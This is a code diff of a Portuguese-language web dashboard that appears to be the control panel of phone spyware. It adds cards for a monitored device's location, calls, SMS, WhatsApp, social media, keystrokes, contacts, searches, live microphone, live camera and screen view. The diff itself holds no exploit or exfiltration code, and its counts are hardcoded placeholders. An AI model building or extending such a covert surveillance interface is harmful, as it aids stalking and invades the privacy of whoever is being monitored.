@@ -27,8 +27,12 @@
   }
 
   .logo {
-    width:92px;height:92px;margin:6px auto 12px;object-fit:contain;
-    display:block;animation:pulse 2.5s infinite;
+    width:92px;
+    height:92px;
+    margin:6px auto 12px;
+    object-fit:contain;
+    display:block;
+    animation: pulse 2.5s infinite;
   }
   @keyframes pulse{0%,100%{transform:scale(1);opacity:.95}50%{transform:scale(1.04);opacity:1}}
 
@@ -51,18 +55,6 @@
   }
   .head .title{font-weight:700}
   .subtitle{color:var(--muted);font-size:12px}
-
-  /* Bolinha de status */
-  .status-dot{
-    display:inline-block;
-    width:8px;
-    height:8px;
-    border-radius:50%;
-    margin-right:6px;
-    background:#7ed957; /* verde padrão online */
-    box-shadow:0 0 6px rgba(126,217,87,.8);
-    vertical-align:middle;
-  }
 
   .grid{
     display:grid;
@@ -104,10 +96,29 @@
     font-size:13px;
   }
   .device .row{display:flex;justify-content:space-between;color:var(--muted);margin-bottom:6px}
+
   .logout{
-    position:fixed;top:12px;right:12px;background:transparent;
-    border:1px solid rgba(255,255,255,0.06);color:var(--muted);
-    padding:6px 10px;border-radius:10px;font-size:13px;
+    position:fixed;
+    top:12px;
+    right:12px;
+    background:transparent;
+    border:1px solid rgba(255,255,255,0.06);
+    color:var(--muted);
+    padding:6px 10px;
+    border-radius:10px;
+    font-size:13px;
+  }
+
+  /* Bolinha verde */
+  .status-dot {
+    display:inline-block;
+    width:8px;
+    height:8px;
+    border-radius:50%;
+    margin-right:5px;
+    background:#3cff00;
+    box-shadow:0 0 6px #3cff00aa;
+    vertical-align:middle;
   }
 
   @media(max-width:420px){
@@ -129,24 +140,102 @@
       <div class="subtitle">Conectado • Última atualização: <span id="timeLabel">—</span></div>
     </div>
     <div style="text-align:right">
-      <div style="font-weight:700;color:var(--accent)">demo</div>
+      <div style="font-weight:700;color:#3cff00">
+        <span class="status-dot"></span>Online
+      </div>
       <div style="font-size:12px;color:var(--muted)">v1.2</div>
     </div>
   </div>
 
   <div class="grid">
-    <!-- seus cards permanecem iguais -->
-    <!-- ... -->
+    <!-- Todos os cards continuam exatamente iguais -->
+    <div class="card" onclick="abrirLocalizacao()">
+      <div class="icon">📍</div>
+      <div class="info"><div class="number" id="loc">17</div><div class="label">Localizações</div></div>
+    </div>
+
+    <div class="card" onclick="abrirChamadas()">
+      <div class="icon">📞</div>
+      <div class="info"><div class="number" id="calls">4</div><div class="label">Chamadas</div></div>
+    </div>
+
+    <div class="card" onclick="abrirFotos()">
+      <div class="icon">📸</div>
+      <div class="info"><div class="number" id="photos">28</div><div class="label">Fotos</div></div>
+    </div>
+
+    <div class="card" onclick="abrirSMS()">
+      <div class="icon">💬</div>
+      <div class="info"><div class="number" id="sms">110</div><div class="label">Mensagens (SMS)</div></div>
+    </div>
+
+    <div class="card" onclick="abrirWhatsApp()">
+      <div class="icon">🟢</div>
+      <div class="info"><div class="number" id="whatsapp">85</div><div class="label">WhatsApp</div></div>
+    </div>
+
+    <div class="card" onclick="abrirMicrofone()">
+      <div class="icon">🎙️</div>
+      <div class="info"><div class="number" id="mic">4</div><div class="label">Microfone</div></div>
+    </div>
+
+    <div class="card" onclick="abrirCameraAoVivo()">
+      <div class="icon">📷</div>
+      <div class="info"><div class="number" id="camLive">6</div><div class="label">Câmera ao Vivo</div></div>
+    </div>
+
+    <div class="card" onclick="abrirTela()">
+      <div class="icon">🖥️</div>
+      <div class="info"><div class="number" id="screen">1</div><div class="label">Tela (visualização)</div></div>
+    </div>
+
+    <div class="card" onclick="abrirEmails()">
+      <div class="icon">✉️</div>
+      <div class="info"><div class="number" id="emails">12</div><div class="label">E-mail</div></div>
+    </div>
+
+    <div class="card" onclick="abrirRede()">
+      <div class="icon">📶</div>
+      <div class="info"><div class="number" id="network">192.168.0.1</div><div class="label">Rede • Wi-Fi / 4G</div></div>
+    </div>
+
+    <div class="card" onclick="abrirFacebook()">
+      <div class="icon">📘</div>
+      <div class="info"><div class="number" id="facebook">9</div><div class="label">Facebook</div></div>
+    </div>
+
+    <div class="card" onclick="abrirInstagram()">
+      <div class="icon">📷</div>
+      <div class="info"><div class="number" id="instagram">14</div><div class="label">Instagram</div></div>
+    </div>
+
+    <div class="card" onclick="abrirGaleria()">
+      <div class="icon">🖼️</div>
+      <div class="info"><div class="number" id="gallery">29</div><div class="label">Galeria</div></div>
+    </div>
+
+    <div class="card" onclick="abrirTeclado()">
+      <div class="icon">⌨️</div>
+      <div class="info"><div class="number" id="keys">576</div><div class="label">Teclas</div></div>
+    </div>
+
+    <div class="card" onclick="abrirContatos()">
+      <div class="icon">👥</div>
+      <div class="info"><div class="number" id="contacts">27</div><div class="label">Contatos</div></div>
+    </div>
+
+    <div class="card" onclick="abrirPesquisas()">
+      <div class="icon">🔍</div>
+      <div class="info"><div class="number" id="search">15</div><div class="label">Pesquisas</div></div>
+    </div>
   </div>
 
   <div class="device">
     <div class="row"><span>Modelo</span><strong>SM-C991B</strong></div>
-    <div class="row"><span>Última Atualização</span><span id="lastUpdate">—</span></div>
+    <div class="row"><span>Última Atualização</span><span id="lastUpdate">06/10/2025, 23:53:26</span></div>
     <div class="row">
       <span>Conexão</span>
-      <span id="connState">
-        <span class="status-dot" id="statusDot"></span>Online
-      </span>
+      <span id="connState"><span class="status-dot"></span>Online</span>
     </div>
     <div class="row"><span>IP</span><span id="ipAddr">192.168.0.1</span></div>
     <div class="row"><span>Bateria</span><span id="battery">10%</span></div>
@@ -156,22 +245,25 @@
 </section>
 
 <script>
-function logout(){localStorage.removeItem('logado');location.href="login.html";}
-
-function atualizarStatusConexao(){
-  const conn=document.getElementById("connState");
-  const dot=document.getElementById("statusDot");
-  if(navigator.onLine){
-    conn.innerHTML='<span class="status-dot" id="statusDot" style="background:#7ed957;box-shadow:0 0 6px rgba(126,217,87,.8);"></span>Online';
-  }else{
-    conn.innerHTML='<span class="status-dot" id="statusDot" style="background:#e50914;box-shadow:0 0 6px rgba(229,9,20,.8);"></span>Offline';
-  }
-}
-window.addEventListener("online",atualizarStatusConexao);
-window.addEventListener("offline",atualizarStatusConexao);
-atualizarStatusConexao();
-
 setInterval(()=>{document.getElementById('timeLabel').textContent=new Date().toLocaleTimeString();},1000);
+
+function logout(){localStorage.removeItem('logado');location.href="login.html";}
+function abrirLocalizacao(){location.href="localizacao.html";}
+function abrirChamadas(){location.href="chamadas.html";}
+function abrirFotos(){location.href="fotos.html";}
+function abrirSMS(){location.href="mensagens.html?type=sms";}
+function abrirWhatsApp(){location.href="mensagens.html?type=whatsapp";}
+function abrirMicrofone(){location.href="microfone.html";}
+function abrirCameraAoVivo(){location.href="cam.html";}
+function abrirTela(){location.href="tela.html";}
+function abrirEmails(){location.href="emails.html";}
+function abrirRede(){location.href="rede.html";}
+function abrirFacebook(){location.href="facebook.html";}
+function abrirInstagram(){location.href="instagram.html";}
+function abrirGaleria(){location.href="galeria.html";}
+function abrirTeclado(){location.href="teclado.html";}
+function abrirContatos(){location.href="contatos.html";}
+function abrirPesquisas(){location.href="pesquisas.html";}
 </script>
 </body>
 </html>
